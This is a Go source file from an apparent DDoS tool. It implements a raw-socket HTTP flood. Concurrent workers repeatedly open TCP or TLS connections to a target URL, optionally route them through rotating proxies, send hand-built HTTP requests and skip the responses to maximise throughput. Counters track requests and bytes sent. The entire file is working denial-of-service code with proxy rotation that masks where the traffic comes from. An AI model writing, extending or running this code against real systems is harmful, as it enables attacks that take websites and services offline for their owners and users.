package ddos

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"sync/atomic"
)


// startRawSocketAttack starts raw socket attack
func (d *DDoSAttack) startRawSocketAttack() {
	d.startRawSocketWorkers(d.config.MaxThreads)
}

// startRawSocketWorkers starts raw socket workers
func (d *DDoSAttack) startRawSocketWorkers(numWorkers int) {
	// Determine if we should use TLS
	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
	host, port, _ := d.parseTargetURL(targetURL, useTLS)

	// Create request builder
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.rawSocketWorker(host, port, useTLS)
	}
}

// rawSocketWorker performs raw socket attack
func (d *DDoSAttack) rawSocketWorker(host, port string, useTLS bool) {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.rawSocketConnection(host, port, useTLS)
		}
	}
}

// rawSocketConnection creates a raw socket connection and sends requests
func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Connect
	var conn net.Conn
	var err error
	var usedProxy string

	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	// Proxy support for raw socket (use first proxy if available, rotation handled by worker distribution)
	if len(d.proxies) > 0 {
		// Use round-robin proxy selection
		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
		proxyURL := d.proxies[int(idx)%len(d.proxies)]
		usedProxy = proxyURL
		conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
	}

	// Fallback to direct connection
	if conn == nil && err == nil {
		if useTLS {
			tlsConfig := d.createTLSConfig()
			conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
		} else {
			conn, err = dialer.Dial("tcp", host+":"+port)
		}
	}

	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		if usedProxy != "" {
			d.markProxyFailure(usedProxy)
		}
		return
	}
	defer conn.Close()

	if usedProxy != "" {
		d.markProxySuccess(usedProxy)
	}

	// Build and send raw HTTP request
	req, err := d.requestBuilder.(*RequestBuilder).BuildRequest()
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	httpRequest := buildRawHTTPRequest(req, host)
	if httpRequest == nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	atomic.AddInt64(&d.requestsSent, 1)
	atomic.AddInt64(&d.bytesSent, int64(len(httpRequest)))

	// Send request
	_, err = conn.Write(httpRequest)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	// Always skip response reading for maximum efficiency
	atomic.AddInt64(&d.requestsSuccess, 1)
}


// buildRawHTTPRequest converts an HTTP request to raw bytes
func buildRawHTTPRequest(req *http.Request, host string) []byte {
	// Build request line
	requestLine := fmt.Sprintf("%s %s HTTP/1.1\r\n", req.Method, req.URL.RequestURI())

	// Build headers
	headers := requestLine
	headers += fmt.Sprintf("Host: %s\r\n", host)

	for key, values := range req.Header {
		for _, value := range values {
			headers += fmt.Sprintf("%s: %s\r\n", key, value)
		}
	}

	headers += "\r\n"

	// Convert to bytes
	return []byte(headers)
}

